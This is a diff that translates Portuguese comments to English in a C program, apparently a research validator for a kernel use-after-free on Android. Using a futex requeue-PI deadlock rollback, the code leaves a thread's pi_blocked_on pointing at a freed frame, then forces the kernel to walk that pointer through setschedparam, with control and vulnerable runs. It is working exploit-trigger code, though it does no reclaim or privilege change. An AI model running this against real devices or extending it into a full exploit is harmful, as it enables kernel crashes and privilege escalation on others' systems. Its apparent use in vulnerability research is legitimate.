@@ -1,24 +1,24 @@
 /*
- * ghostlock_uaf_check.c — Fase 3: validador de UAF, RAM-only, 1 shot.
+ * ghostlock_uaf_check.c — Phase 3: UAF validator, RAM-only, 1 shot.
  *
- * Pergunta: apos o rollback EDEADLK, o pi_blocked_on do waiter continua
- * apontando para o frame liberado (vulneravel) ou foi limpo (corrigido)?
+ * Question: after EDEADLK rollback, does waiter's pi_blocked_on still
+ * point to the freed frame (vulnerable) or was it cleared (fixed)?
  *
- * Desenho (sem reclaim, sem escrita, sem cred):
- *  - perna CONTROL: trio waiter/owner SEM cmp (waiter acorda por timeout,
- *    estado limpo), waiter segue VIVO dormindo, setschedparam nele.
- *  - perna VULN: trio + CMP_REQUEUE_PI -> EDEADLK (rollback), teardown
- *    limpo, waiter segue VIVO dormindo com frame liberado, mesmo
- *    setschedparam nele.
- *  - controle roda primeiro; anomalia no controle ABORTA a perna vuln.
- *  - waiter nunca da join antes do consume: join mata a task e o
- *    dangling junto. thread destacada + cancel no fim.
+ * Design (no reclaim, no write, no creds):
+ *  - CONTROL leg: waiter/owner trio WITHOUT cmp (waiter wakes via timeout,
+ *    clean state), waiter remains ALIVE sleeping, setschedparam on it.
+ *  - VULN leg: trio + CMP_REQUEUE_PI -> EDEADLK (rollback), clean
+ *    teardown, waiter remains ALIVE sleeping with freed frame, same
+ *    setschedparam on it.
+ *  - Control runs first; anomaly in control ABORTS the vuln leg.
+ *  - Waiter never joins before consume: join kills task and dangling
+ *    pointer with it. Detached thread + cancel at the end.
  *
- * Sinal: consumer na VULN percorre pi_blocked_on pendurado (conteudo
- * estagnado) vs CONTROL (nunca bloqueada -> caminho rapido ret 0).
- * Sem reclaim o frame costuma intacto: walk benigno; panico possivel,
- * improvavel (janela de ms, sem spray). Aparelho de pesquisa com
- * recuperacao fisica. Nada persiste.
+ * Signal: consumer in VULN walks dangling pi_blocked_on (stale content)
+ * vs CONTROL (never blocked -> fast path ret 0).
+ * Without reclaim the frame is usually intact: benign walk; panic possible,
+ * unlikely (ms window, no spray). Research device with physical recovery.
+ * Nothing persists.
  *
  * Build: aarch64-linux-android28-clang -O2 -Wall -static
  *   ghostlock_uaf_check.c -o ghostlock_uaf_check
@@ -81,7 +81,7 @@ static void *waiter_fn(void *u) {
     xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
     xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
     w_done = 1;
-    /* vivo e parado: frame antigo sem reuso, task com estado final */
+    /* alive and idle: old frame without reuse, task in final state */
     sleep(60);
     return NULL;
 }
@@ -97,7 +97,7 @@ static void *owner_fn(void *u) {
     return NULL;
 }
 
-/* consumer: troca de policy forca __sched_setscheduler completo no alvo */
+/* consumer: policy switch forces full __sched_setscheduler on target */
 static int consume(pthread_t wt, const char *tag) {
     struct sched_param p = { .sched_priority = 0 };
     int bad = 0;
@@ -124,7 +124,7 @@ static void reset(void) {
     w_ready = w_waiting = w_done = o_started = 0;
 }
 
-/* perna: use_cmp=0 controle (timeout), =1 vuln (EDEADLK). retorna 0 ok. */
+/* leg: use_cmp=0 control (timeout), =1 vuln (EDEADLK). returns 0 ok. */
 static int leg(int use_cmp, const char *tag) {
     reset();
     pthread_t w, o;
@@ -140,7 +140,7 @@ static int leg(int use_cmp, const char *tag) {
         cmpe = errno;
         printf("[%s] cmp_errno=%d (%s)\n", tag, cmpe, strerror(cmpe));
     } else {
-        usleep(1300000); /* waiter acorda sozinho por timeout */
+        usleep(1300000); /* waiter wakes up on its own via timeout */
     }
     xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
     pthread_join(o, NULL);
@@ -148,26 +148,26 @@ static int leg(int use_cmp, const char *tag) {
     while (!w_done && spins++ < 100)
         usleep(20000);
     if (!w_done) {
-        printf("[%s] ABORT: waiter nao voltou (w_done=0)\n", tag);
+        printf("[%s] ABORT: waiter did not return (w_done=0)\n", tag);
         return -1;
     }
     int bad = consume(w, tag);
-    pthread_detach(w); /* processo sai e leva tudo; nada persiste */
+    pthread_detach(w); /* process exits and cleans up everything; nothing persists */
     if (use_cmp && cmpe != EDEADLK)
-        printf("[%s] WARN: sem EDEADLK, rollback nao atingido\n", tag);
+        printf("[%s] WARN: without EDEADLK, rollback was not reached\n", tag);
     return bad;
 }
 
 int main(void) {
-    setbuf(stdout, NULL); /* panic mata o buffer libc: sem flush, sem evidencia */
-    printf("[info] uaf validator: control -> vuln, 1 shot cada\n");
+    setbuf(stdout, NULL); /* panic kills libc buffer: no flush, no evidence */
+    printf("[info] uaf validator: control -> vuln, 1 shot each\n");
     int rc = leg(0, "control");
     if (rc) {
-        printf("[verdict] ABORT: controle anomalo, vuln nao executada\n");
+        printf("[verdict] ABORT: anomalous control, vuln not executed\n");
         return 2;
     }
     rc = leg(1, "vuln");
-    printf("[verdict] done control=ok vuln_ret=%d (0=consumer limpo; comparar tempos/errnos acima)\n",
+    printf("[verdict] done control=ok vuln_ret=%d (0=clean consumer; compare timings/errnos above)\n",
            rc);
     return 0;
 }
